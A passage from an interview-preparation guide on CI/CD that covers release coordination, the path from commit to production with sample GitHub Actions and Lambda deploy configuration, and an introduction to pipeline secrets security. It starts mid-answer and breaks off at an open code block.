The hard case: a feature spans several services (say, an API, a worker, and a frontend) with interdependencies, and they must release *together* without a broken intermediate state.

The senior playbook centers on **backward compatibility so ordering doesn't matter**, plus a runbook:

1. **Make changes independently deployable** — the classic expand/contract. The API adds the *new* endpoint while keeping the old; the frontend can deploy before or after because both API versions work during the transition. Never ship a change that requires two services to flip atomically.
2. **Version the contract** — the API/schema is versioned alongside the artifacts, so consumers negotiate. A breaking contract change is additive first (new version added), consumers migrate, old version removed later.
3. **Sequence by dependency** — deploy the *provider* of a new capability before the *consumer* that needs it (API before frontend). Feature-flag the consumer-facing part so it's dark until every service is ready.
4. **Coordinate the release, not the deploy** — deploy each service independently and safely (dark), then *release* by flipping a shared flag once all are in place. Deploy is per-service; release is the coordinated flip.
5. **Runbook + checklist** — a written sequence, health checks between steps, and a rollback/kill-switch plan per service.

The one-line answer interviewers want: **avoid the coordinated release entirely by making every change backward-compatible and independently deployable, then use a feature flag as the single coordinated "release" switch.** Big-bang simultaneous deploys of interdependent services are fragile; expand/contract + flags turn a scary coordination problem into independent, reversible steps.

### Q15. Walk me through cutting a release end to end — and what belongs on the checklist.

The end-to-end flow for a well-automated team, from merge to communicated release:

1. **Merge** a Conventional-Commit PR to `main`; CI runs the full build/test suite and produces the immutable artifact (digest-addressed).
2. **Compute the version** — semantic-release/changesets analyzes commits since the last tag and derives the next semver.
3. **Tag & changelog** — create the annotated (ideally signed) tag, generate the changelog, open a GitHub/GitLab Release with notes.
4. **Publish** — push the artifact to the registry/package repo under the new version; attach binaries/SBOM/checksums to the Release.
5. **Deploy** — promote that *same* artifact through environments (staging → prod), per [[Environments & Promotion]] and [[GitOps & Pull-based CD]].
6. **Release** — flip the feature flag (if deploy and release are decoupled) to expose the change; progressively ramp.
7. **Verify & communicate** — watch metrics/canary, post release notes to consumers, update docs.

A **release checklist / runbook** typically covers: tests and security scans green; version and changelog correct; migrations backward-compatible and tested; rollback/kill-switch plan confirmed; on-call aware; feature flags configured; docs and API references updated; deprecations announced with a timeline; stakeholders/consumers notified.

The senior point: in a mature setup, steps 1–5 are **fully automated** — "cutting a release" is merging a PR, and the pipeline does the rest honestly and repeatably. The checklist exists for the *judgment* parts (is now a safe time, is the rollback plan real, are consumers warned) — the toil is automated away, and the human attention goes to the decisions machines can't make. And whatever you release is immutable: if it's wrong, you roll forward to a new version, never rewrite the one that shipped.
## How Code Reaches Production

### Summary

**What this topic covers**

The single most-asked platform interview question in disguise: *"walk me through how a line of code gets from a developer's laptop to serving production traffic."* This topic is the end-to-end path and the decision points at every hop — short-lived branch → pull request → **PR pipeline** (build, test, lint, SAST, container scan, preview env) → review + required checks → **merge to main** (a merge queue keeps main green) → **main/CD pipeline** builds one **immutable artifact** keyed by git-sha → pushes to a registry → **auto-deploy to staging** → automated e2e/smoke → **promotion to production** (the *same* artifact, gated by approval or fully automated) → a **deployment strategy** executes (rolling/blue-green/canary) → post-deploy health checks → observability watches error rate & latency → **automatic or manual rollback** if unhealthy. The 16 questions here turn that narrative into concrete walkthroughs for different contexts (a K8s web app, a serverless function, a mobile app, a library), plus the cross-cutting concerns: who approves what, config per environment, feature flags letting merge ≠ release, GitOps, database migrations, and "design the path to prod for a new service."

**Mental model**

Think of the path to prod as a **funnel of increasing confidence and blast radius**. Early stages are cheap, fast, and run on every change (build + unit tests on a PR); later stages are slower, more realistic, and touch real users (staging e2e, canary in prod). The golden rule threaded through the whole path: **build the artifact once, then promote that exact artifact through every environment** — never rebuild per stage, or "works in staging, breaks in prod" becomes unexplainable. What *changes* between environments is **configuration injected at deploy time** (env vars, secrets, endpoints), not the artifact. The second mental shift: **merge, release, and deploy are three separate events**. Merging code to main doesn't mean users see it — feature flags and progressive rollout decouple "the code is deployed" from "the feature is on." A mature path to prod is **boring**: small changes, frequent deploys, automated gates, fast rollback. Deploys are a non-event, not a Friday-night war room.

**Key terms**

- **PR pipeline** — checks that run on a pull request before merge: build, unit/integration tests, lint, SAST, container scan, sometimes a preview environment. Its job is fast feedback and keeping main green.
- **Required checks / branch protection** — repo rules that block merge until named checks pass and reviews are approved.
- **Merge queue** — serializes merges and re-tests each PR against the latest main so main never goes red from a semantic conflict.
- **Immutable artifact** — a build output (container image, jar, zip) that is never modified after creation, versioned by git-sha or digest.
- **Artifact registry** — where built artifacts live (GHCR, ECR, Artifactory, Nexus); the single source of deployable bits.
- **Promotion** — moving the *same* artifact from one environment to the next (staging → prod), not rebuilding.
- **Continuous Delivery vs Continuous Deployment** — delivery: every green build is *releasable*, a human clicks deploy; deployment: every green build auto-ships to prod with no human gate.
- **Deployment strategy** — how new code replaces old: recreate, rolling, blue-green, canary.
- **Feature flag** — a runtime switch that turns a code path on/off without a deploy, decoupling deploy from release.
- **GitOps** — Git holds desired state; an in-cluster agent (ArgoCD/Flux) pulls and reconciles it, so a commit to a config repo *is* the deploy trigger.
- **Health check / smoke test** — a lightweight post-deploy probe confirming the new version actually serves traffic before it takes load.
- **Rollback** — reverting to the previous known-good artifact (or flipping traffic back) when a deploy is unhealthy.

**Why interviewers ask this**

This is the highest-signal DevOps question because it forces you to connect every concept into one coherent story. A junior recites "push, CI runs, it deploys." A senior narrates the *decision points*: where the artifact is built (once), what gates each transition, who approves prod, how config differs per env, how rollback works, and what happens when a deploy goes bad at 2am. The interviewer is probing whether you've actually *operated* a pipeline versus read about one — do you know why you build once and promote, why staging must mirror prod, why a merge queue exists, why feature flags matter? Getting the "build once, promote the same artifact" principle wrong is an instant tell. Nailing the full narrative — including failure and rollback — signals you can *design* a path to prod, not just click "merge."

**Common confusions**

- "CI/CD is one thing" — CI (keep main green via merge + test) and CD (get releasable/shipped) are distinct; and CD splits into delivery vs deployment.
- "The artifact is rebuilt for each environment" — no; rebuilding per env destroys reproducibility. Build once, promote the digest.
- "Merging to main means it's live" — not with feature flags or manual promotion gates; merge, release, and deploy are separate.
- "Staging catches everything" — staging reduces risk but is never identical to prod; canary + observability catch what staging misses.
- "Rollback = redeploy the old code from source" — ideally you re-point to the previous *artifact* or flip traffic; rebuilding from an old commit is slow and risky.
- "GitOps is just CI running kubectl" — GitOps *pulls* desired state from Git via an in-cluster agent; a CI system running kubectl is a *push* model.

**What follows from this topic**

This is the spine that the security topics hang off. **Secrets & Security in CI/CD** covers how the deploy step authenticates to the cloud (OIDC, least-privilege identities) at the "promotion to production" hop. **Pipeline Security & Supply Chain** hardens the "build the immutable artifact" step (provenance, signing, verifying only trusted artifacts run). If you can narrate this path cleanly, those topics slot in as "and here's how we make each hop trustworthy."

### Q1. Walk me through how a line of code gets from a developer's laptop to production.

The canonical end-to-end path. I'll narrate the happy path and flag the decision point at each hop.

1. **Branch + local dev** — the developer cuts a short-lived branch off `main`, writes code, runs tests/linters locally (pre-commit hooks catch the cheap stuff), and pushes.
2. **Open a PR** — this triggers the **PR pipeline**: build the code, run unit + integration tests, lint, run SAST and a container/dependency scan, and often spin up an ephemeral **preview environment**. *Decision point:* every check must pass and be a **required** check.
3. **Review + required checks** — a human reviews; branch protection blocks merge until reviews are approved and checks are green.
4. **Merge to main** — a **merge queue** re-tests the PR against the latest main so a semantic conflict can't turn main red. *Now main is the source of truth.*
5. **Main/CD pipeline** — on merge, the CD pipeline builds the **immutable artifact exactly once** (a container image tagged with the git-sha), and pushes it to the **artifact registry**.
6. **Deploy to staging** — automatically deploy that artifact to staging with staging config injected. Run **automated e2e/smoke tests**; optionally manual QA.
7. **Promotion to production** — promote the **same artifact** (same digest) to prod. *Decision point:* gated by a required-reviewer approval (continuous delivery) or fully automated (continuous deployment).
8. **Deployment strategy executes** — rolling/blue-green/canary swaps the new version in. Post-deploy **smoke tests + health checks** confirm it serves traffic.
9. **Observe** — dashboards/alerts watch error rate, latency, saturation. If a canary's metrics degrade, **rollback** — automatically or with one click — to the previous artifact.

The two invariants: **build once, promote the same artifact**, and **config (not code) changes per environment**.

### Q2. What's the difference between Continuous Delivery and Continuous Deployment, and how does that change the path to prod?

They differ at exactly one hop — the **promotion to production** gate.

| | Continuous Delivery | Continuous Deployment |
|---|---|---|
| Every green build is… | *releasable* | *released* |
| Prod gate | a human clicks "deploy" / approves | none — auto-ships |
| Best for | regulated domains, high-blast-radius changes, immature observability | high-trust teams, strong test suites + canary + fast rollback |
| Risk control | human judgment | automation + progressive rollout + auto-rollback |

In **delivery**, the pipeline builds, tests, and stages everything, then *stops* at an approval step — the artifact sits ready and a person promotes it when the business is ready. In **deployment**, that gate is removed: a green merge flows to prod on its own, and safety comes from canary analysis and automated rollback rather than a human.

Note both require the *same* upstream rigor. Continuous Deployment isn't "less careful" — it's *more* automated. You only remove the human gate once your tests, canary analysis, and rollback are trustworthy enough to replace human judgment. Most orgs run continuous *delivery* to prod and continuous *deployment* to staging.

### Q3. Why must you build the artifact once and promote it, rather than rebuilding per environment?

Because **rebuilding breaks the one guarantee that makes staging meaningful: that staging and prod run identical bits.**

If you rebuild per environment, each build can pick up a different base image digest, a floating dependency version, a different compiler, or a different build-time flag. Now "it passed in staging" tells you nothing about prod, because prod is a *different artifact*. Every "works here, breaks there" incident becomes unexplainable.

Build once means:
- The artifact is tagged by **git-sha or content digest** and stored immutably in the registry.
- Every environment deploys **that exact digest**.
- The *only* thing that differs per environment is **configuration injected at deploy time** — env vars, secrets, endpoints, replica counts — never the code.

```yaml
# GitHub Actions: build once on merge to main, tag by sha
on:
  push:
    branches: [main]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: docker/build-push-action@v6
        with:
          push: true
          tags: ghcr.io/acme/my-app:${{ github.sha }}
```

Deploy jobs for staging and prod both reference `ghcr.io/acme/my-app:${{ github.sha }}` — same digest, different config. This is also the foundation of trustworthy rollback: the previous digest is still sitting in the registry, ready to re-deploy.

### Q4. Design the path to production for a new containerized web service on Kubernetes.

I'd stand up this pipeline:

**PR stage** (`on: pull_request`): build the image, run unit + integration tests, lint, SAST (CodeQL), scan the image (Trivy), and deploy an ephemeral preview namespace. Require these checks + one review via branch protection. Use a **merge queue**.

**On merge to main:** build the image once, tag `:${{ github.sha }}`, push to the registry, and — critically — I'd go **GitOps** rather than have CI run `kubectl`. CI updates the image digest in a config repo (a Kustomize/Helm values file); **ArgoCD** in the cluster reconciles it.

```yaml
# after building & pushing ghcr.io/acme/my-app:<sha>
# CI bumps the image tag in the config repo; ArgoCD deploys it
jobs:
  bump-staging:
    runs-on: ubuntu-latest
    steps:
      - run: |
          yq -i '.image.tag = "${{ github.sha }}"' staging/values.yaml
          git commit -am "staging -> ${{ github.sha }}" && git push
```

**Staging:** ArgoCD deploys to staging automatically; run e2e/smoke against it.

**Prod:** promote by opening a PR that bumps the prod values file to the *same* sha — a required reviewer approves (continuous delivery). Deploy strategy: **rolling** for routine changes with a `readinessProbe` gating each pod, or **canary** (Argo Rollouts) for risky ones — route 5% of traffic, watch error rate/latency, ramp or abort. Migrations run as a pre-deploy Job, backward-compatible (expand/contract). Rollback = ArgoCD revert to the previous digest, or Rollouts abort.

### Q5. Design the path to production for a serverless function.

Serverless changes the *packaging and deploy* mechanics but not the principles. The unit is a **function version/alias** instead of a running pod.

**Build once:** package the function (zip or container image) keyed by git-sha, upload to the artifact store (e.g. object storage / registry), and publish an **immutable function version**.

**Promote via aliases:** the platform's alias/stage is the pointer you move. Staging alias points to the new version; run smoke tests; then move the **prod alias** to the *same* published version — that's the promotion, no rebuild.

**Progressive rollout is first-class:** weighted aliases shift traffic gradually (e.g. 10% to the new version), and you watch error rate/duration/throttles. If a CloudWatch/monitoring alarm fires, the platform auto-shifts traffic back — **automatic canary rollback** with almost no infrastructure of your own.

```yaml
deploy-prod:
  runs-on: ubuntu-latest
  permissions: { id-token: write, contents: read }  # OIDC, no long-lived keys
  steps:
    - uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: arn:aws:iam::123456789012:role/deploy
        aws-region: eu-west-1
    - run: |
        VER=$(aws lambda publish-version --function-name my-app --query Version --output text)
        aws lambda update-alias --function-name my-app --name prod \
          --routing-config "AdditionalVersionWeights={$VER=0.1}"  # 10% canary
```

Config differs per env via environment variables on the alias/stage. The big serverless win: rollback is instant (repoint the alias) and canary is built in.

### Q6. Design the path to production for a mobile app. How is it different?

Mobile breaks the "deploy = instantly live for everyone" assumption because **an app-store review sits between your pipeline and your users**, and users run *old versions* for months.

Key differences:
- **The store is the deploy target, and it's gated by review** — you can't fully control timing, and you can't instantly roll back a shipped binary. Rollback means shipping a *forward fix* or halting the phased release.
- **Staged rollout is the safety net** — release to 1% → 10% → 50% → 100% of users over days (Play Console staged rollout, App Store phased release), watching crash-free rate and reviews. Halt if crash rate spikes.
- **Feature flags + remote config are essential** — since you can't redeploy the binary quickly, you ship code dark behind a flag and turn features on server-side. This is how mobile teams get "instant rollback" of a *feature* without a store round-trip.
- **Version skew is permanent** — many app versions hit your backend simultaneously, so backend APIs must stay backward-compatible for a long tail.

Pipeline shape: PR checks (build, unit tests, lint) → merge → CI builds the signed artifact once (`.ipa`/`.aab`) via EAS/Fastlane → upload to **TestFlight / internal track** → automated + manual QA on real devices → promote the *same build* to the store's staged rollout → monitor crash-free sessions → ramp or halt. Build once, promote the same binary — identical principle, store-shaped mechanics.

### Q7. Design the path to production for a shared library or package.

Libraries invert the model: there's **no deploy to a server** — "prod" is a **published package version** that other teams consume. The path optimizes for *versioning and trust*, not rollout.

- **PR stage:** build against a **matrix** of supported language/runtime versions, run the full test suite, lint, and check public-API compatibility.
- **Versioning:** semantic versioning is the contract. A breaking change is a *major* bump; the pipeline should fail if the public API changed without a version bump (API-diff tooling).
- **Release trigger:** publish on a **git tag** (`v1.4.0`), not on every merge — you don't want every commit to be a release.
- **Build once:** build the artifact once and publish that exact artifact to the registry (npm, PyPI, Maven Central, crates.io). Never rebuild between "test" and "publish."
- **Supply-chain hygiene matters more here** — you're upstream of everyone else, so **sign the artifact** (provenance/attestations) and publish an immutable version that can never be overwritten. "Rollback" is impossible (you can't un-publish); instead you **yank** and ship a patched version.

```yaml
on:
  push:
    tags: ['v*']
jobs:
  publish:
    permissions: { id-token: write, contents: read }  # npm provenance via OIDC
    steps:
      - uses: actions/setup-node@v4
        with: { registry-url: 'https://registry.npmjs.org' }
      - run: npm ci && npm test && npm publish --provenance --access public
```

The unit of "promotion" is a human deciding to cut a release tag; the unit of "rollback" is a new patched version, because published versions are immutable.

### Q8. What is a preview (ephemeral) environment and where does it fit in the path to prod?

A **preview environment** is a full, disposable deployment of the app spun up *per pull request*, torn down when the PR merges or closes. It sits in the **PR pipeline**, before merge.

Why it earns its keep:
- **Real review** — reviewers and PMs click an actual running URL instead of imagining the change from a diff.
- **Realistic integration testing** — run e2e tests against a live environment that mirrors prod topology, catching wiring/config bugs unit tests miss.
- **Isolation** — each PR gets its own namespace/URL, so parallel PRs don't collide.

Mechanics: on `pull_request`, deploy the freshly built image to a per-PR namespace (`pr-1234.preview.acme.dev`), comment the URL on the PR, and clean up on close. Vercel/Netlify do this natively for frontends; on K8s it's a per-PR namespace via your GitOps tooling or a vcluster.

The one gotcha: preview envs need **isolated, non-prod data and scoped credentials** — never point a fork's preview at prod databases or hand it prod secrets (which ties directly into the fork-PR secret risks in the security topics).

### Q9. How does configuration differ across environments if the artifact is identical?

The artifact is a sealed box; **configuration is injected at deploy time from the outside**. This is the "build once" principle's necessary complement.

What changes per environment:
- **Endpoints** — database URLs, cache hosts, downstream service URLs.
- **Secrets** — credentials, API keys, tokens (pulled from a secret manager per env, never baked in).
- **Scale/tuning** — replica counts, memory limits, log levels, timeouts, feature-flag defaults.

How it's injected: environment variables, a mounted config file, or a config service the app reads at startup. In Kubernetes, that's a per-environment `ConfigMap` + `Secret`; in serverless it's per-alias env vars; in 12-factor terms, "config lives in the environment, not the code."

Two rules that keep this safe:
- **Never bake environment-specific config into the artifact** — no `if (env === 'prod')` branching baked at build time, and absolutely no secrets in the image layers or build args.
- **Fail fast on missing config** — the app should validate required config at startup and refuse to boot if something's absent, so a misconfigured deploy dies immediately instead of half-working.

This is what lets the exact same digest be safe in staging and prod: the code is constant, the environment supplies the differences.

### Q10. How do feature flags let "merge" differ from "release"?

A **feature flag** is a runtime switch that gates a code path, so you can **merge and deploy code while the feature stays off**, then turn it on later — independently of any deploy. It decouples three events that teams wrongly conflate: **merge**, **deploy**, and **release**.

Why this is powerful:
- **Trunk-based development at scale** — big features merge to main in small increments behind a flag instead of living on a long-lived branch that rots. Main stays green, integration is continuous.
- **Release ≠ deploy** — marketing wants the feature live at 9am Tuesday? Flip a flag, no deploy needed. The code shipped days ago.
- **Progressive rollout** — enable for internal users → 1% → 10% → everyone, watching metrics. This is canary at the *feature* level, not the infrastructure level.
- **Instant kill switch** — a bad feature is turned *off* in seconds via config, no rollback deploy required. On mobile (where redeploy is slow) this is the *primary* rollback mechanism.

```javascript
if (flags.isEnabled('new-checkout', { userId })) {
  return newCheckout(cart);
}
return legacyCheckout(cart);
```

The cost is **flag debt** — flags must be *removed* once a feature is fully rolled out, or the codebase fills with dead conditionals and untested combinations. Treat flag cleanup as part of the feature's definition of done.

### Q11. Where do database migrations fit in the deployment flow, and why are they the risky part?

Migrations are risky because, unlike code, **the database is stateful and shared, and you can't blue-green a database** — both the old and new app versions run against the *same* schema during a rolling deploy or canary. So the schema must be compatible with *both* versions simultaneously.

The rule: **decouple schema changes from code changes using expand/contract (a.k.a. parallel change).**

1. **Expand** — deploy a backward-compatible schema change first (add the new nullable column/table). Old code ignores it; new code can use it. Never in the same deploy as code that depends on it.
2. **Migrate + deploy code** — deploy the app version that writes to both old and new, or reads the new.
3. **Contract** — once no running version references the old column, a *later* deploy drops it.

Where it runs in the pipeline: as a **pre-deploy step** (a K8s Job / init step / migration task) that runs *before* the new app version takes traffic, and is **idempotent and forward-only**. Avoid "down" migrations in prod — rolling back schema is where outages happen; instead roll *forward* with a corrective migration.

Anti-patterns that cause outages: dropping/renaming a column in the same deploy as the code change (old pods 500 instantly), long-locking migrations on a hot table (add indexes concurrently), and coupling the migration to app startup so a slow migration blocks the whole rollout.

### Q12. What is GitOps and how does it change who/what triggers a deploy?

**GitOps** makes **Git the single source of truth for desired state**, and puts an **agent inside the target environment that continuously pulls that state and reconciles reality to match it.** A commit to the config repo *is* the deploy.

The shift is **push → pull**:

| | Push (CI runs kubectl) | Pull (GitOps: ArgoCD/Flux) |
|---|---|---|
| Who applies changes | the CI system, from outside | an agent inside the cluster |
| Credentials | CI holds cluster admin creds | cluster pulls; no external creds to prod |
| Source of truth | imperative scripts | declarative Git state |
| Drift | undetected | continuously detected & corrected |
| Deploy trigger | pipeline run | merge to the config repo |

How it works: you keep desired state (Helm/Kustomize manifests, image tags) in a Git repo. ArgoCD/Flux watches it and applies any diff to the cluster, and *reverts manual drift* back to what Git says. To deploy, CI doesn't touch the cluster — it just **commits a new image digest to the config repo**, and the agent takes it from there.

Why teams love it: **prod credentials never leave the cluster** (a big security win — CI can't be a path to prod-admin), every change is an auditable Git commit, rollback is `git revert`, and drift self-heals. The trade-off: two repos (app + config) and an extra moving part (the reconciler) to operate.

### Q13. A deploy went bad in production. Walk me through detection and rollback.

I'd narrate the loop the pipeline is designed around: **detect fast, roll back faster, diagnose after.**

**Detect:**
- **Post-deploy smoke tests + health checks** run immediately after the new version takes traffic — if the readiness probe fails, the rollout never completes and (in a canary/rolling deploy) old pods keep serving.
- **Automated canary analysis** watches error rate, latency (p95/p99), and saturation for the canary slice against a baseline. Degradation past a threshold aborts the rollout automatically.
- **Observability alerts** (error-rate SLO burn, latency, 5xx) page if something slips past the canary.

**Roll back:**
- **Re-point to the previous artifact.** Because we build once and keep the previous digest in the registry, rollback is redeploying the last known-good digest — fast and deterministic, *not* rebuilding from an old commit.
- **Blue-green:** flip the router back to the blue (old) environment — near-instant.
- **Canary:** abort and shift 100% back to stable.
- **Feature-flagged change:** kill the flag — no deploy at all, seconds to recover.
- **Bad migration:** roll *forward* with a corrective migration; don't try to reverse-migrate prod under pressure.

**After:** freeze deploys if needed, capture the failing artifact/logs, and write a blameless postmortem. The health of this whole loop is measured by **MTTR** (mean time to recovery) — a mature org optimizes for fast, boring rollback over trying to make deploys never fail.

### Q14. Who approves what on the path to prod? Explain separation of duties and least privilege here.

The path to prod is a chain of gates, and **each gate answers "who is authorized to advance this, and with what power?"** Two principles govern it: **separation of duties** (the person who wrote a change shouldn't be the sole authority who ships it to prod) and **least privilege** (each actor/identity has only the access it needs).

Who approves what:
- **Merge to main** — at least one *reviewer other than the author* approves the PR; branch protection enforces it. This is code-level separation of duties.
- **Deploy to staging** — usually fully automated; low blast radius, no human gate needed.
- **Promotion to production** — a **required reviewer** on the environment (often a different role: senior eng, on-call, release manager) approves. For high-risk systems, a **two-person rule** (two approvers).
- **The pipeline's own identity** — the deploy job assumes a **least-privilege role** scoped to exactly what it deploys (this service, this environment), ideally via **OIDC short-lived creds** so no standing prod keys exist. Build creds and deploy creds are separate.

Everything is **audited**: who approved, who merged, which artifact went where, when — an immutable trail (change management) you can reconstruct after an incident. The interviewer wants to hear that *humans* gate high-blast-radius transitions, *identities* are least-privilege, and *every action is attributable*. This is exactly where the **Secrets & Security in CI/CD** topic picks up.

### Q15. How does the path to prod look different in a low-maturity org versus a high-maturity one, and what's the "boring deploy" goal?

Same skeleton, wildly different feel. Maturity shows up as **deploy size, frequency, automation, and recovery speed** — the DORA metrics.

| | Low maturity | High maturity |
|---|---|---|
| Deploy frequency | monthly, batched | many times a day |
| Change size | huge, many features at once | tiny, one change |
| Deploy timing | scheduled "release nights," all-hands | any time, unremarkable |
| Gating | manual checklists, ticket approvals | automated checks + one approval |
| Rollback | scramble, sometimes forward-only fixes | one click / auto, seconds |
| Failure blast radius | large (big batch) | small (one change, canaried) |

The **"boring deploy" goal** is the north star: deploying should be a **non-event** — small, frequent, automated, reversible. This is counterintuitive to juniors who think careful = infrequent + heavily ceremonied. It's backwards: **infrequent big-bang deploys are the dangerous ones** because they batch many changes (hard to isolate what broke) and the muscle for deploying/rolling back atrophies. Frequent small deploys mean each change is trivially attributable, easy to roll back, and the pipeline is exercised constantly so it actually works when you need it. High-maturity orgs deploy *more often* precisely to be *safer* — this is the core insight behind Continuous Delivery and the DORA research.

### Q16. Design the path to prod for a brand-new service from scratch. What do you set up first?

I'd build it in order of **what unblocks safe iteration soonest**, not big-bang:

**1. Source + branch protection first.** Repo, trunk-based flow, branch protection requiring review + green checks. Even before there's much code, get the gate in place so bad habits never form.

**2. PR pipeline (CI).** Build + test + lint on every PR. Fast (< 10 min) or people route around it. Add SAST and dependency/container scanning early — cheap now, painful to retrofit.

**3. Build-once artifact + registry.** On merge to main, build the image tagged by git-sha, push to the registry. Establish the immutability contract from commit one.

**4. Staging environment + auto-deploy.** Deploy the artifact to staging automatically; run smoke/e2e. Staging should mirror prod topology as closely as budget allows.

**5. Prod deploy with a strategy + rollback.** Start simple — **rolling with health checks** and a manual promotion gate (continuous *delivery*). Ensure rollback (re-deploy previous digest) works and is *tested* before you need it.

**6. Config + secrets per env** via a secret manager, injected at deploy; OIDC for cloud auth so there are no long-lived keys.

**7. Observability wired before prod traffic** — health checks, error-rate/latency dashboards, alerts. You cannot safely deploy what you can't see.

**8. Iterate toward maturity** — add canary/blue-green, automate the prod gate (continuous deployment) once tests + observability + rollback are trustworthy, add feature flags, GitOps.

The philosophy: **start with the safest simple version of every hop (rolling deploy, manual gate, working rollback), then automate as trust grows.** Don't build canary analysis on day one; do build working rollback on day one.

## Secrets & Security in CI/CD

### Summary

**What this topic covers**

CI/CD is the softest, highest-value target in most infrastructures: it **holds the keys to production**, runs code on every push, and is often under-secured relative to the prod systems it can reach. This topic is about defending it. The 16 questions cover: why the pipeline is such a prize, **secrets management** (repo/org/environment secrets vs external managers like Vault / AWS Secrets Manager / GCP Secret Manager, and the limits of log masking), **OIDC / short-lived cloud credentials** (the single most important modern practice — eliminate long-lived cloud keys entirely), **least-privilege pipeline identities** (scoping the deploy role and the `GITHUB_TOKEN`), **protecting secrets from fork PRs** (the `pull_request` vs `pull_request_target` footgun), **environment protection rules**, secret rotation, preventing leakage (logs, artifacts, build args, image layers), scanning for leaked secrets (gitleaks/trufflehog), privileged/Docker-socket runner risks, **ephemeral runners**, signing commits/tags, pinning third-party actions by SHA, auditing deploys, break-glass access, and a "secure this pipeline" scenario.

**Mental model**

Treat your CI/CD system as a **production system with production-level blast radius**, because it is — a compromised pipeline is a compromised prod. Three sub-models: **(1) Identity over secrets.** The modern goal is to store *no* long-lived cloud credentials at all — the pipeline proves *who it is* to the cloud via OIDC and receives a short-lived token scoped to one repo/branch. A stolen log or artifact then contains no reusable key. **(2) Trust boundaries.** The critical line is trusted (base-repo, push, main) vs untrusted (a fork's PR running attacker-controlled code). Secrets must never cross into untrusted execution — this is the entire `pull_request_target` class of bugs. **(3) Least privilege + ephemerality.** Every identity (deploy role, `GITHUB_TOKEN`, runner) gets the minimum scope, for the minimum time, on a throwaway machine — so a compromise has the smallest possible blast radius and no persistence.

**Key terms**

- **Secret** — any credential the pipeline needs (API key, token, cloud key, signing key). Should be injected at runtime, never committed.
- **Secrets manager** — an external system of record for secrets (Vault, AWS/GCP Secret Manager) with access control, rotation, and audit, versus storing them in the CI provider.
- **Environment secret** — a secret scoped to a specific deployment environment (e.g. `production`) and gated by that environment's protection rules.
- **OIDC federation** — the pipeline presents a signed identity token; the cloud's trust policy validates it and returns **short-lived** credentials by assuming an IAM role. No stored long-lived keys.
- **id-token permission** — the workflow permission that lets a job request its OIDC token (`permissions: id-token: write`).
- **Trust policy / conditions** — cloud-side rules scoping which repo/branch/environment may assume a role (e.g. `sub` must match `repo:acme/app:ref:refs/heads/main`).
- **`GITHUB_TOKEN`** — the automatically provisioned, job-scoped token; its `permissions:` should be minimized (default read-only).
- **`pull_request` vs `pull_request_target`** — `pull_request` runs fork code *without* secrets; `pull_request_target` runs in the *base* repo context *with* secrets — dangerous if it checks out/executes fork code.
- **Secret masking** — CI redacts known secret values from logs; a defense-in-depth backstop, not a guarantee.
- **Ephemeral runner** — a fresh, single-job runner destroyed after use, so nothing persists between jobs.
- **Secret scanning** — tools (gitleaks, trufflehog) that detect committed/leaked secrets.
- **Break-glass** — a controlled, heavily-audited emergency path to elevated access.

**Why interviewers ask this**

Because this is where DevOps meets security, and it separates people who *ran* a pipeline from people who *secured* one. A junior stores an AWS key as a repo secret and thinks masking makes logs safe. A senior says "we don't store cloud keys at all — OIDC, short-lived, scoped to the repo and branch by the trust policy," and can explain *why* fork PRs must never see secrets and how `pull_request_target` leaks them. The interviewer is probing threat awareness: do you understand that CI is a top attack path (it can reach prod, pulls untrusted dependencies, and runs code on every push), and can you name the concrete controls — least privilege, ephemerality, OIDC, environment protection, SHA-pinned actions? "Secure this pipeline" is a favorite because it's open-ended and instantly reveals depth.

**Common confusions**

- "Masking makes logs safe" — masking only redacts values CI *knows*; a base64/transformed/derived secret slips through. It's a backstop, not a control.
- "Secrets in GitHub are encrypted so they're safe" — encryption at rest doesn't stop a malicious workflow step, a fork PR, or an over-scoped token from *reading* them.
- "Fork PRs can't hurt us, they're just proposals" — a fork PR runs *your* CI on attacker-controlled code; with the wrong trigger it gets your secrets.
- "OIDC is just another secret" — the point of OIDC is there's *no stored secret*; the token is minted per-run and expires in minutes.
- "The GITHUB_TOKEN is harmless" — with write scope it can push code, publish packages, or open a path to prod; scope it down.
- "Pinning actions to `@v4` is pinning" — `@v4` is a *moving* tag; only a full commit SHA is immutable.

**What follows from this topic**

This is the "protect the credentials and the execution environment" half of pipeline security. **Pipeline Security & Supply Chain** is the other half — protecting the *integrity of what you build and ship* (provenance, signing, verifying only trusted artifacts run, SLSA). The fork-PR/`pull_request_target` risk here is the same root as **poisoned pipeline execution** there. And the whole reason least-privilege deploy identities matter is the **path to prod** from the previous topic — this topic hardens the "promotion to production" hop.

### Q1. Why is CI/CD such a high-value target for attackers?

Because the pipeline is a **concentrated, trusted, and often under-defended path straight to production.** It sits at the intersection of every property an attacker wants.

- **It has the keys to prod.** By definition, CD can deploy to production — it holds (or can mint) the credentials to do so. Compromise the pipeline and you don't need to break prod directly; the pipeline *is* the door. **A compromised pipeline = compromised prod.**
- **It runs code on every push.** Every PR, every merge triggers execution. If an attacker can influence *what* runs (a malicious dependency, a poisoned build step from a fork PR, a compromised third-party action), they get code execution inside a trusted environment.
- **It pulls untrusted inputs.** Dependencies, base images, third-party actions — the pipeline reaches out and executes other people's code as part of every build (the supply-chain angle).
- **It's often less monitored than prod.** Teams harden prod servers but leave CI runners with broad IAM, long-lived keys, and admin `GITHUB_TOKEN` scopes — a soft underbelly.
- **It's a supply-chain multiplier.** If you ship a library or image, poisoning your pipeline poisons *everyone downstream* (SolarWinds, Codecov).

So the pipeline deserves **prod-grade security**: least-privilege identities, no long-lived secrets (OIDC), ephemeral runners, protected trust boundaries, audit logging. The mental one-liner to give the interviewer: *"CI/CD is production infrastructure with the blast radius of production, so I secure it like production."*

### Q2. How should secrets be managed in a pipeline? Walk through the options.

Ranked worst to best:

**Never: hardcoded / committed.** Secrets in the repo, in a Dockerfile `ENV`, in code. Even if deleted, they're in Git history forever — rotate immediately if this happens.

**Baseline: CI provider secrets.** GitHub/GitLab store encrypted secrets injected as env vars at runtime. Scope them as tightly as the platform allows — **repo → org → environment**, preferring **environment secrets** (e.g. `production`) gated by protection rules so only approved deploys to that env can read them.

**Better: an external secrets manager.** Vault / AWS Secrets Manager / GCP Secret Manager as the system of record. The pipeline fetches secrets at runtime (authenticating via OIDC, below). Benefits: centralized rotation, fine-grained access policies, full audit of who read what, and secrets aren't duplicated across dozens of repos.

**Best (for cloud access): no stored secret at all — OIDC.** For authenticating to a cloud, don't store a key *anywhere*; federate identity and mint short-lived credentials per run (next question).

```yaml
